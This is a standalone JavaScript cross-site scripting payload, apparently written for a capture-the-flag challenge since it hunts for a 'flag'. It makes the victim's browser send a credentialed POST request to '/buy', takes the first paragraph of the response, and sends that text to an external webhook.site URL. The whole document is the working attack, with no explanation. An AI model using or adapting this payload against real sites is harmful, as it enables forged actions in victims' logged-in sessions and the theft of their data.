<script>
fetch("/buy", {
  method: "POST",
  headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: "id=0",
  credentials: 'include'
})
.then(response => response.text())
.then(data => {
  const parser = new DOMParser();
  const htmlDocument = parser.parseFromString(data, "text/html");
  const pElements = htmlDocument.getElementsByTagName("p");
  let flagContent = "";

  if (pElements.length > 0) {
      flagContent = pElements[0].textContent; 
  }

  if (flagContent) {
      const targetUrl = `https://webhook.site/0600baa7-548f-4793-9b3f-6c6869bf05dd?m=${encodeURIComponent(flagContent)}`;
      fetch(targetUrl, { method: "GET" })
      .then(response => console.log("Content sent successfully"))
      .catch(error => console.error("Error sending content:", error));
  }
})
.catch(error => console.error("Error during the process:", error));
</script>
